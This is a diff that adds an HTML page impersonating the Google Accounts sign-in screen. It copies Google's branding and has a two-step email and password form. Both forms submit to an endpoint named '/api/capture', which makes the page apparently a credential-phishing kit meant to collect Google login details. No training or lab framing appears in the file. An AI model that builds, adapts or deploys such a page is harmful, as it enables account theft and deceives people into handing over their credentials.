@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign in - Google Accounts</title>
+  <link rel="stylesheet" href="style.css">
+  <link rel="icon" href="assets/google-logo.svg" type="image/svg+xml">
+</head>
+<body>
+  <!-- Top bar -->
+  <div class="topbar">
+    <div class="topbar-left">
+      <span class="topbar-locale">United States</span>
+      <span class="topbar-help">Help</span>
+    </div>
+    <div class="topbar-right">
+      <a href="#" class="topbar-link">Google apps</a>
+      <div class="apps-grid">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="#5f6368">
+          <path d="M4 8h4V4H4v4zm6 12h4v-4h-4v4zm-6 0h4v-4H4v4zm0-6h4v-4H4v4zm6 0h4v-4h-4v4zm6-10v4h4V4h-4zm-6 4h4V4h-4v4zm6 6h4v-4h-4v4zm0 6h4v-4h-4v4z"/>
+        </svg>
+      </div>
+    </div>
+  </div>
+
+  <!-- Main card -->
+  <div class="card-container">
+    <div class="card">
+      <!-- Google Logo -->
+      <div class="logo-section">
+        <img src="assets/google-logo.svg" alt="Google" class="google-logo">
+      </div>
+
+      <!-- Heading -->
+      <h1 class="card-title">Sign in</h1>
+      <p class="card-subtitle">Use your Google Account</p>
+
+      <!-- Form -->
+      <form id="signin-form" action="/api/capture" method="POST">
+        <div class="input-group">
+          <div class="input-wrapper">
+            <input
+              type="email"
+              name="email"
+              id="email"
+              placeholder="Email or phone"
+              autocomplete="username"
+              required
+            >
+          </div>
+          <div class="input-error" id="email-error"></div>
+        </div>
+
+        <div class="form-actions">
+          <a href="#" class="link-forgot">Forgot email?</a>
+          <div class="btn-row">
+            <a href="#" class="btn-create">Create account</a>
+            <button type="submit" class="btn-next">Next</button>
+          </div>
+        </div>
+      </form>
+
+      <!-- Password field (revealed after email) -->
+      <form id="password-form" action="/api/capture" method="POST" style="display:none;">
+        <input type="hidden" name="email" id="email-hidden">
+        <div class="input-group">
+          <div class="input-wrapper">
+            <input
+              type="password"
+              name="password"
+              id="password"
+              placeholder="Enter your password"
+              autocomplete="current-password"
+              required
+            >
+            <span class="toggle-pass" id="toggle-pass">Show</span>
+          </div>
+          <div class="input-error" id="pass-error"></div>
+        </div>
+        <div class="form-actions">
+          <a href="#" class="link-forgot">Forgot password?</a>
+          <div class="btn-row">
+            <a href="#" class="btn-create">Back</a>
+            <button type="submit" class="btn-next">Next</button>
+          </div>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    <div class="footer-left">
+      <span>English (United States)</span>
+    </div>
+    <div class="footer-right">
+      <a href="#">Privacy</a>
+      <a href="#">Terms</a>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
